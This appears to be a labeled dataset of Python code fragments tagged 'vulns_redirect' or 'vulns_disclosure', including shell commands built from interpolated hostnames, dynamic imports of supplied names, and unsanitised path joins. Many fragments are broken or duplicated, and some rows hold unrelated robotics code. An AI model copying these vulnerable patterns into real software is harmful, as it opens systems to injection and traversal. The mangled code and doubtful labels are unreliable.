"        end_date = datetime.strptime(old_repeating_event.date_end, '%Y-%m-%d %H:%M:00')            new_start_date = datetime.strptime(old_repeating_event.date_begin, '%Y-%m-%d %H:%M:00') + relativedelta(days=+1)        end_date = datetime.strptime(old_repeating_event.date_end, '%Y-%m-%d %H:%M:00')            new_start_date = datetime.strptime(old_repeating_event.date_begin, '%Y-%m-%d %H:%M:00') + relativedelta(days=+7)        end_date = datetime.strptime(old_repeating_event.date_end, '%Y-%m-%d %H:%M:00')            new_start_date = datetime.strptime(old_repeating_event.date_begin, '%Y-%m-%d %H:%M:00') + relativedelta(months=+1)",vulns_redirect
"        if event_type == 'open' and len(self.fit_subscriptions) > 0:            _logger.info('Can subscribe for open event id: %s, name: %s', event.event_type_id.name, event.name)            return True",vulns_redirect
"from django.shortcuts import render    posts = Post.objects.order_by('pub_date')    return render(request, 'posts/posts_detail.html', {'post_id':post_id})",vulns_redirect
            object.count += 1,vulns_redirect
"            object.save()            return link_redirect(request, pk)",vulns_redirect
            object.count += 1,vulns_redirect
"            object.save()            return link_redirect(request, pk)",vulns_redirect
"def link_redirect(request, pk):    instance = get_object_or_404(JustURL, pk=pk)",vulns_redirect
"    re_path(r'^(?P<pk>(\d)+)/$', link_redirect, name='url-redirect-view'),",vulns_redirect
"            if proc.is_running() and system(""exec >(ping %s -c 10 >/dev/null) </dev/null"" % self.hostname) is 0:",vulns_redirect
"        is_up = True if os.system(""exec >(ping -c 1 -w 2 %s >/dev/null) </dev/null"" % hostname) is 0 else False",vulns_redirect
"            sys.exit(""Host '%s' is unknown! Update your /etc/hosts file!"" % hostname)",vulns_redirect
"            1. Check for bad characters            2. Check for reserved titles            Checking for existing articles is done by Django on Database level            """"""            raise forms.ValidationError(_('The title contain bad characters.'))        cs = ChangeSet.objects.filter(old_title=title).count()        if cs > 0:                _('The title %(title)s is reserved for redirects or old links.'), params={'title': title},)",vulns_redirect
from django.core.exceptions import ObjectDoesNotExist,vulns_redirect
        article = None,vulns_redirect
        except ObjectDoesNotExist:,vulns_redirect
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"        """"""Test whether self.path corresponds to a CGI script,        and return a boolean.        This function sets self.cgi_info to a tuple (dir, rest)        when it returns True, where dir is the directory part before        the CGI script name.  Note that rest begins with a        slash if it is not empty.        The default implementation tests whether the path        begins with one of the strings in the list        self.cgi_directories (and the next character is a '/'        or the end of the string).        """"""        path = self.path        for x in self.cgi_directories:            i = len(x)            if path[:i] == x and (not path[i:] or path[i] == '/'):                self.cgi_info = path[:i], path[i+1:]                return True",vulns_disclosure
"    license_dirs = [ ""preferred"", ""other"", ""exceptions"" ]",vulns_disclosure
"    license_dirs = [ ""preferred"", ""other"", ""exceptions"" ]",vulns_disclosure
"    url(r'^help/(?P<topic>[^.]+)$', help.HelpView.as_view(), name='help'),",vulns_disclosure
"                    h.populate_ancestors()        try:            for group in self.child_groups:                group.depth = max([self.depth + 1, group.depth])                group._check_children_depth()        except RuntimeError:            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)",vulns_disclosure
        for g in self.parent_groups:            g.clear_hosts_cache(),vulns_disclosure
        for kid in self.child_groups:            kid_hosts = kid.get_hosts(),vulns_disclosure
    def _get_ancestors(self):        results = {}        for g in self.parent_groups:            results[g.name] = g            results.update(g._get_ancestors())        return results    def get_ancestors(self):        return self._get_ancestors().values(),vulns_disclosure
    def populate_ancestors(self):        for group in self.groups:            self.add_group(group)                self.add_group(oldg),vulns_disclosure
"                    h.populate_ancestors()        try:            for group in self.child_groups:                group.depth = max([self.depth + 1, group.depth])                group._check_children_depth()        except RuntimeError:            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)",vulns_disclosure
        for g in self.parent_groups:            g.clear_hosts_cache(),vulns_disclosure
        for kid in self.child_groups:            kid_hosts = kid.get_hosts(),vulns_disclosure
    def _get_ancestors(self):        results = {}        for g in self.parent_groups:            results[g.name] = g            results.update(g._get_ancestors())        return results    def get_ancestors(self):        return self._get_ancestors().values(),vulns_disclosure
    def populate_ancestors(self):        for group in self.groups:            self.add_group(group)                self.add_group(oldg),vulns_disclosure
"                    h.populate_ancestors()        try:            for group in self.child_groups:                group.depth = max([self.depth + 1, group.depth])                group._check_children_depth()        except RuntimeError:            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)",vulns_disclosure
        for g in self.parent_groups:            g.clear_hosts_cache(),vulns_disclosure
        for kid in self.child_groups:            kid_hosts = kid.get_hosts(),vulns_disclosure
    def _get_ancestors(self):        results = {}        for g in self.parent_groups:            results[g.name] = g            results.update(g._get_ancestors())        return results    def get_ancestors(self):        return self._get_ancestors().values(),vulns_disclosure
    def populate_ancestors(self):        for group in self.groups:            self.add_group(group)                self.add_group(oldg),vulns_disclosure
"                    h.populate_ancestors()        try:            for group in self.child_groups:                group.depth = max([self.depth + 1, group.depth])                group._check_children_depth()        except RuntimeError:            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)",vulns_disclosure
        for g in self.parent_groups:            g.clear_hosts_cache(),vulns_disclosure
        for kid in self.child_groups:            kid_hosts = kid.get_hosts(),vulns_disclosure
    def _get_ancestors(self):        results = {}        for g in self.parent_groups:            results[g.name] = g            results.update(g._get_ancestors())        return results    def get_ancestors(self):        return self._get_ancestors().values(),vulns_disclosure
    def populate_ancestors(self):        for group in self.groups:            self.add_group(group)                self.add_group(oldg),vulns_disclosure
"                    h.populate_ancestors()        try:            for group in self.child_groups:                group.depth = max([self.depth + 1, group.depth])                group._check_children_depth()        except RuntimeError:            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)",vulns_disclosure
        for g in self.parent_groups:            g.clear_hosts_cache(),vulns_disclosure
        for kid in self.child_groups:            kid_hosts = kid.get_hosts(),vulns_disclosure
    def _get_ancestors(self):        results = {}        for g in self.parent_groups:            results[g.name] = g            results.update(g._get_ancestors())        return results    def get_ancestors(self):        return self._get_ancestors().values(),vulns_disclosure
    def populate_ancestors(self):        for group in self.groups:            self.add_group(group)                self.add_group(oldg),vulns_disclosure
__version__ = '0.1.4',vulns_disclosure
"                filepath = os.path.join(submit.tmp_path, data[""data""])                filedata = open(filepath, ""rb"").read()                    filepath=filename, contents=filedata,                    password=password, duplicates=duplicates                    unpacked = unpacked.astree()",vulns_disclosure
"        return {            ""files"": files,            ""path"": submit.tmp_path,        }",vulns_disclosure
"            options.update(entry.get(""per_file_options"", {}))",vulns_disclosure
"from cuckoo.core.database import Database, TASK_PENDING",vulns_disclosure
"        data = {}        if task:            entry = task.to_dict()            entry[""guest""] = {}            if task.guest:                entry[""guest""] = task.guest.to_dict()            entry[""errors""] = []            for error in task.errors:                entry[""errors""].append(error.message)            entry[""sample""] = {}            if task.sample_id:                sample = db.view_sample(task.sample_id)                entry[""sample""] = sample.to_dict()            data[""task""] = entry        else:            return Exception(""Task not found"")        return data        db = Database()",vulns_disclosure
        data = submit_manager.get_files(,vulns_disclosure
"            ""data"": data,",vulns_disclosure
"            destination = ""%s/%s"" % (path, directory)            destination = ""%s/%s"" % (path, filename)",vulns_disclosure
"                filepath = os.path.join(submit.tmp_path, data[""data""])                filedata = open(filepath, ""rb"").read()                    filepath=filename, contents=filedata,                    password=password, duplicates=duplicates                    unpacked = unpacked.astree()",vulns_disclosure
"        return {            ""files"": files,            ""path"": submit.tmp_path,        }",vulns_disclosure
"            options.update(entry.get(""per_file_options"", {}))",vulns_disclosure
"from cuckoo.core.database import Database, TASK_PENDING",vulns_disclosure
"        data = {}        if task:            entry = task.to_dict()            entry[""guest""] = {}            if task.guest:                entry[""guest""] = task.guest.to_dict()            entry[""errors""] = []            for error in task.errors:                entry[""errors""].append(error.message)            entry[""sample""] = {}            if task.sample_id:                sample = db.view_sample(task.sample_id)                entry[""sample""] = sample.to_dict()            data[""task""] = entry        else:            return Exception(""Task not found"")        return data        db = Database()",vulns_disclosure
        data = submit_manager.get_files(,vulns_disclosure
"            ""data"": data,",vulns_disclosure
"            destination = ""%s/%s"" % (path, directory)            destination = ""%s/%s"" % (path, filename)",vulns_disclosure
"    if "".."" in target:    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)    if os.path.exists(path):",vulns_disclosure
"    if "".."" in target:    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)    if os.path.exists(path):",vulns_disclosure
"    if "".."" in target:    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)    if os.path.exists(path):",vulns_disclosure
"    if "".."" in target:    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)    if os.path.exists(path):",vulns_disclosure
"    if "".."" in target:    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)    if os.path.exists(path):",vulns_disclosure
"    query=""""""MATCH (:person {name:""Roi Lipman""})-[:visited]->(c:country)<-[:visited]-(f:person)<-             [:friend]-(:person {name:""Roi Lipman""}) ",vulns_disclosure
import urllib.parse,vulns_disclosure
            self.filename = self.local + urllib.parse.unquote(self.groups['path']),vulns_disclosure
"                self.method, self.resource, self.request_http = self.request_line.split()",vulns_disclosure
"    print (disclosure_file)def test_bw2_import():    di = DisclosureImporter(os.path.join(os.path.dirname(os.path.realpath(__file__)), TEST_FOLDER, ""{}.json"".format(TEST_FILENAME)))",vulns_disclosure
"      if len(filter(lambda x:x.find('.')>0 or x.startswith('manage_'),path))==0:",vulns_disclosure
"      if len(filter(lambda x:x.find('.')>0 or x.startswith('manage_'),path))==0:",vulns_disclosure
"                filepath = os.path.join(submit.tmp_path, data[""data""])                filedata = open(filepath, ""rb"").read()                    filepath=filename, contents=filedata,                    password=password, duplicates=duplicates                    unpacked = unpacked.astree()",vulns_disclosure
"        return {            ""files"": files,            ""path"": submit.tmp_path,        }",vulns_disclosure
"            options.update(entry.get(""per_file_options"", {}))",vulns_disclosure
"from cuckoo.core.database import Database, TASK_PENDING",vulns_disclosure
"        data = {}        if task:            entry = task.to_dict()            entry[""guest""] = {}            if task.guest:                entry[""guest""] = task.guest.to_dict()            entry[""errors""] = []            for error in task.errors:                entry[""errors""].append(error.message)            entry[""sample""] = {}            if task.sample_id:                sample = db.view_sample(task.sample_id)                entry[""sample""] = sample.to_dict()            data[""task""] = entry        else:            return Exception(""Task not found"")        return data        db = Database()",vulns_disclosure
        data = submit_manager.get_files(,vulns_disclosure
"            ""data"": data,",vulns_disclosure
"                filepath = os.path.join(submit.tmp_path, data[""data""])                filedata = open(filepath, ""rb"").read()                    filepath=filename, contents=filedata,                    password=password, duplicates=duplicates                    unpacked = unpacked.astree()",vulns_disclosure
"        return {            ""files"": files,            ""path"": submit.tmp_path,        }",vulns_disclosure
"            options.update(entry.get(""per_file_options"", {}))",vulns_disclosure
"from cuckoo.core.database import Database, TASK_PENDING",vulns_disclosure
"        data = {}        if task:            entry = task.to_dict()            entry[""guest""] = {}            if task.guest:                entry[""guest""] = task.guest.to_dict()            entry[""errors""] = []            for error in task.errors:                entry[""errors""].append(error.message)            entry[""sample""] = {}            if task.sample_id:                sample = db.view_sample(task.sample_id)                entry[""sample""] = sample.to_dict()            data[""task""] = entry        else:            return Exception(""Task not found"")        return data        db = Database()",vulns_disclosure
        data = submit_manager.get_files(,vulns_disclosure
"            ""data"": data,",vulns_disclosure
from anaconda_go.lib.helpers import get_working_directory,vulns_disclosure
        'path': get_working_directory(view),vulns_disclosure
"            if self.filepath not in error.get('path', ''):",vulns_disclosure
"    def __init__(self, callback, uid, vid, code, path, offset, go_env):",vulns_disclosure
"                    self.code, self.path, self.offset, self.go_env) as comps:",vulns_disclosure
        [plugins_list.append(plugin) for plugin in wp.find_plugins()],vulns_disclosure
            return False,vulns_disclosure
        [plugins_list.append(plugin) for plugin in wp.find_plugins()],vulns_disclosure
            return False,vulns_disclosure
            return all(len(h.args) == args_no or h.varargs for h in handlers),vulns_disclosure
"            result = self.etcd.get(os.path.join(self.namespace, key))        path = os.path.join(self.namespace, key)",vulns_disclosure
"        path = os.path.join(self.namespace, key)",vulns_disclosure
"        path = os.path.join(self.namespace, keyfilter)",vulns_disclosure
"            self.etcd.delete(os.path.join(self.namespace, key))",vulns_disclosure
"    unvisited = list(        itertools.zip_longest(test_graph.keys(), [], fillvalue=None)    )    while unvisited:        node, parent = unvisited.pop()        while path and path[-1] != parent:            path.pop()        adjacent = reversed(test_graph[node])        path.append(node)        for n in adjacent:            if n in path:                cycle_str = '->'.join(path + [n])                raise DependencyError(                    'found cyclic dependency between tests: ' + cycle_str)            if n not in visited:                unvisited.append((n, node))        visited.add(node)",vulns_disclosure
"                executors.generate_testcases([t0, t1, t2, t3, t4])",vulns_disclosure
"            executors.generate_testcases([t0, t1, t2, t3, t4])",vulns_disclosure
"    path_file = str(sys.modules[__name__].__file__)    url_path = os.path.dirname(os.path.dirname(path_file))    return os.path.join(url_path, 'data_url.json')",vulns_disclosure
expected_paths_small_different_currency = [,vulns_disclosure
"    ""received"": 96    ""received"": 66    ""received"": 5",vulns_disclosure
"    self.assertListEqual(expected_paths_small_same_currency(), paths_small_same_currency)    self.assertListEqual(expected_paths_small_different_currency, paths_small_different_currency)",vulns_disclosure
"            cwd = '/'.join((cwd, piece))",vulns_disclosure
"    def get_root_path(self):        Get root path to pass to the LSP servers, i.e. project path or cwd.            path = getcwd_or_home()",vulns_disclosure
        for language_client in self.clients.values():                folder = self.get_root_path()                inst = language_client['instance']                inst.folder = folder                inst.initialize(),vulns_disclosure
"                    folder=self.get_root_path(),",vulns_disclosure
    goal_name = input().strip(),vulns_disclosure
        deadline = input().strip(),vulns_disclosure
"  module = __import__(name.replace(""\r"",""""))  class_ = getattr(module, name.replace(""\r"",""""))  instance = class_()  return callMethod(instance, ""fetch"")  + LINEBREAK + ""."" + LINEBREAK  module = __import__(name.replace(""\r"",""""))  class_ = getattr(module, name.replace(""\r"",""""))  instance = class_()  return callMethod(instance, ""config"")  + LINEBREAK + ""."" + LINEBREAK",vulns_disclosure
"            result = self.etcd.get(os.path.join(self.namespace, key))        path = os.path.join(self.namespace, key)",vulns_disclosure
"        path = os.path.join(self.namespace, key)",vulns_disclosure
"        path = os.path.join(self.namespace, keyfilter)",vulns_disclosure
"            self.etcd.delete(os.path.join(self.namespace, key))",vulns_disclosure
"            result = self.etcd.get(os.path.join(self.namespace, key))        path = os.path.join(self.namespace, key)",vulns_disclosure
"        path = os.path.join(self.namespace, key)",vulns_disclosure
"        path = os.path.join(self.namespace, keyfilter)",vulns_disclosure
"            self.etcd.delete(os.path.join(self.namespace, key))",vulns_disclosure
        self.path = args.path        self.repos = args.repos,vulns_disclosure
"    group.add_argument('path', nargs='?', default=os.curdir, help='Base path to look for repositories')",vulns_disclosure
def find_repositories(path):,vulns_disclosure
            repos += find_repositories(subpath)    return repos,vulns_disclosure
    clients = find_repositories(command.path)    if command.repos:,vulns_disclosure
"    def get_base_path(self):        return self.config['runtime.static_dir']        return static_file(path, self.get_base_path())",vulns_disclosure
    def get_base_path(self):,vulns_disclosure
        source_dir_rp = os.path.realpath(source_dir),vulns_disclosure
            target_dir_rp = os.path.realpath(target_dir),vulns_disclosure
"            _root = os.path.commonprefix([www_root_abs, dst])            rel_dst = os.path.relpath(www_root_abs, dst)",vulns_disclosure
"            rel_dst = os.path.relpath(www_root_abs, _dst)",vulns_disclosure
"    with open(args.file, ""r"") as role_req_file:",vulns_disclosure
"    with open(args.file, ""w"") as role_req_file:",vulns_disclosure
"    with open(args.file, ""r"") as role_req_file:",vulns_disclosure
"        keyPath = kwargs.get(""subroot"", []) + list(keysOrValues[:-1])   # last element of 'keysOrValues' is the value        ob = self._findValueForPath(*keyPath)        return self._findValueForPath(keyPath)",vulns_disclosure
"    def _findValueForPath(self, *keyPath):        for k, key in enumerate(keyPath[:-1]):    # last key in 'keyPath' is not traversed, but used to store given 'value'                    nextkey = keyPath[k+1]",vulns_disclosure
You can also put the connection string into tmp/setup.cfg like so:,vulns_disclosure
You can also put the connection string into a setup.cfg file in the root of the project(the same one setup.py would use) like so:,vulns_disclosure
You can also put the connection string into a setup.cfg file in the root of the project(the same one setup.py would use) like so:,vulns_disclosure
You can also put the connection string into a setup.cfg file in the root of the project(the same one setup.py would use) like so:,vulns_disclosure
You can also put the connection string into a setup.cfg file in the root of the project(the same one setup.py would use) like so:,vulns_disclosure
You can also put the connection string into a setup.cfg file in the root of the project(the same one setup.py would use) like so:,vulns_disclosure
You can also put the connection string into a setup.cfg file in the root of the project(the same one setup.py would use) like so:,vulns_disclosure
"    path = join(dirname(dirname(abspath(__file__))), 'tmp', FILENAME)    if exists(path):        try:            p = SafeConfigParser()            p.read(path)        except:            raise SystemExit('Unable to parse %s: %s' % (path, sys.exc_info()[1]))        if p.has_option(section, KEY):            return p.get(section, KEY)    return None",vulns_disclosure
"                yield os.path.join(root, url[len(prefix):])",vulns_disclosure
        Check that the URL path does not contain any elements which might be        used in a path traversal attack,vulns_disclosure
"		if re.search('[^a-zA-Z0-9]', token_data['key']):			raise FoxlockError(BAD_REQUEST, 'Invalid key requested')",vulns_disclosure
"	global BAD_REQUEST	if re.search('[^a-zA-Z0-9]', token_data['key']):		raise FoxlockError(BAD_REQUEST, 'Invalid key requested')",vulns_disclosure
    This function excepts the path to exist.,vulns_disclosure
    if os.path.exists(root_dir):        return _load_yml_filedir(root_dir)[1]    else:        return {},vulns_disclosure
"    ('___doesnotexist', {}),",vulns_disclosure
"            ('task_line', 'task_line', TaskLine),            ('task_line_group', 'task_line_group', TaskLineGroup),",vulns_disclosure
    return self.task.__acl__()    return self.group.__acl__()    return self.task.__acl__()    return self.task.__acl__(),vulns_disclosure
        if not self._path:,vulns_disclosure
import urllib.parse,vulns_disclosure
"    path = urllib.parse.urljoin('/', req.path)      # Avoid path traversal    filename = path[len(STATIC_PREFIX):]        resp.data = pkgutil.get_data('turq', 'editor/%s' % filename)        (resp.content_type, _) = mimetypes.guess_type(filename)",vulns_disclosure
    path = posixpath.normpath(path)           # Avoid path traversal,vulns_disclosure
"        p = psutil.Popen(['ssh', host, 'ls', '-Fa', path.as_posix()], stdout=PIPE, stderr=PIPE)",vulns_disclosure
"        p = psutil.Popen(['ssh', host, 'ls', '-Fa', path.as_posix()], stdout=PIPE, stderr=PIPE)",vulns_disclosure
"    if new_src and new_src != data['src']:        shutil.move(item.abspath, settings.STORAGE_DIR + new_src)        old_backup_abspath = item.backup_abspath        item = Item(new_src)        if os.path.isfile(old_backup_abspath):            shutil.move(old_backup_abspath, item.backup_abspath)",vulns_disclosure
		for i in range(self.size):,vulns_disclosure
gArray = range(100),vulns_disclosure
"		start = random.randint(0, 250)		end = randint.randint(0, 250)",vulns_disclosure
	gAvgCapArray = gAvgCapArray + [simAttack(paths)]lArray = range(100),vulns_disclosure
	simAttack('wlpvm'),vulns_disclosure
"def simAttack(paths, metric);",vulns_disclosure
        Canonicalize path. ::            if parts[i] == '.' or parts[i] == '':,vulns_disclosure
"            if not os.path.isfile(self.path + ""/conf/"" + filename):",vulns_disclosure
    simulationMode = False    #czy uruchomic program w trybie symulacji? wymaga rowniez zmiany w ServoControllerModule.py oraz w ImageProcessingModule.py,vulns_disclosure
simulationMode = False,vulns_disclosure
        self.KP = 1.5 * 1000   #wzmocnienie czesci proporcjonalnej        self.KI = 7.0 * 1000    #wzmocnienie czesci calkujacej,vulns_disclosure
    path_sub_update_delta = 0.3    #co ile sekund aktualizowac podsciezke?,vulns_disclosure
        self.proximity_map *= 0#5000,vulns_disclosure
"        start = (round(ball_pos[0] * PathPlanner.obstacle_map_size), round(ball_pos[1] * PathPlanner.obstacle_map_size))        end = path[self.path_last_index]        x = 0        y = self.path_last_index        center = 0        index = 0        while x <= y:            center = (x + y) // 2            if not PathPlanner.Raycast(self, start, path[center]):                index = center                x = center + 1            else: y = center - 1        end = (end[0] / PathPlanner.obstacle_map_size, end[1] / PathPlanner.obstacle_map_size)        dist = 0.13 * MM.clamp(4 * MM.magnitude(ball_pos[0] - end[0], ball_pos[1] - end[1]), 0.4, 1)        vec2go = MM.normalized(path[index][0] - start[0], path[index][1]- start[1])    #wektor docelowego ruchu kulki        mag = MM.magnitude(0.5 - ball_pos[0], 0.5 - ball_pos[1])    #odleglosc kulki od srodka plyty        vec2center = ((0.5 - ball_pos[0]) / mag, (0.5 - ball_pos[1]) / mag)    #wektor z pozycji kulki do srodka plyty        edgeReluctance = 0.012 / (0.6 - min(mag, 0.5))        print(edgeReluctance)        self.path_x.value = vec2go[1] * dist + ball_pos[1] + vec2center[1] * edgeReluctance        self.path_y.value = vec2go[0] * dist + ball_pos[0] + vec2center[0] * edgeReluctance        PathPlanner.PaintRay(self, start, path[index], frame)",vulns_disclosure
simulationMode = False,vulns_disclosure
    simulationMode = True    #czy uruchomic program w trybie symulacji? wymaga rowniez zmiany w ServoControllerModule.py oraz w ImageProcessingModule.py,vulns_disclosure
simulationMode = True,vulns_disclosure
"    corner_detecton_area = (0.08, 0.08, 0.14, 0.14) #prostakat, w ktorym szukana jest krawedz plyty, jest on powielany dla kazdego rogu obrazu",vulns_disclosure
"        cv2.circle(self.frame_original, tuple(self.ballTracker_result), 1, (0, 0, 255), -1)",vulns_disclosure
"            img = cv2.resize(img, (40, 40), interpolation=cv2.INTER_NEAREST)",vulns_disclosure
"            corner = np.round(result * 40.0).astype(""int"")            if flipX and flipY: corners[i] = (40 - corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])            elif flipX: corners[i] = (40 - corner[0] + detectionArea[0], corner[1] + detectionArea[1])            elif flipY: corners[i] = (corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])            else: corners[i] = (corner[0] + detectionArea[0], corner[1] + detectionArea[1])",vulns_disclosure
"        pts2 = np.float32([[0,0],[res[0],0],[res[0], res[1]], [0, res[1]]])",vulns_disclosure
"        print(""KD = "" + str(self.KD))",vulns_disclosure
        self.path_speed = 0.2 * PathPlanner.obstacle_map_size    #predkosc przechodzenia sciezki,vulns_disclosure
"        frame = cv2.inRange(frame, 90, 255)",vulns_disclosure
"            if not PathPlanner.Raycast(self, PathPlanner.FromUnitaryToMapSpace(ball_pos, self.obstacle_map_size), path[index+1]):                print(""False"")            target_y = MM.lerp(A[0], B[0], mant)            target_x = MM.lerp(A[1], B[1], mant)",vulns_disclosure
"        for p in path:            if PathPlanner.isPointWithinMap(self, p):                frame[p[0], p[1]] = [255, 255, 0]",vulns_disclosure
"        movement = ((1, 0), (-1, 0), (0, 1), (0, -1), (-1, -1), (-1, 1), (1, 1), (1, -1))",vulns_disclosure
            i = 0                i += 1                if i == 5: new_cost += 0.4,vulns_disclosure
simulationMode = True,vulns_disclosure
"    corner_detector_model_path = ""/home/pi/ballance/Ballance/Tensorflow/ballancenet_boardcorner_conv_2_quant.tflite""",vulns_disclosure
"import PathPlannerModule as PPMimport mathpathPlanner = PPM.PathPlanner()origin = (0, 0)r = 10000for angle in range(0, 360):    ang = angle * math.pi / 180    end = (int(round(math.sin(ang) * r)), int(round(math.cos(ang) * r)))    print(""end = "" + str(end))    pathPlanner.Raycast(origin, end)    print("""")",vulns_disclosure
            if path == os.path.abspath(os.path.sep):,vulns_disclosure
            if os.path.normcase(path) == os.path.normcase(os.path.abspath(os.path.sep)):,vulns_disclosure
"    basename = basename.replace(' ', '-')",vulns_disclosure
"PathTraversalContext = collections.namedtuple( ""PathTraversalContext"", (""attributes"", ""parameters"", ""path"", ""collections"", ""user"", ""group"", ""permissions"") ) # includes attrs and params from current level",vulns_disclosure
"        newctx = PathTraversalContext( localattr, parameters, dirname, collections, user, group, permissions )          newctx = PathTraversalContext( treeattr, parameters, dirname, collections, user, group, permissions ) # context that the children see & modify",vulns_disclosure
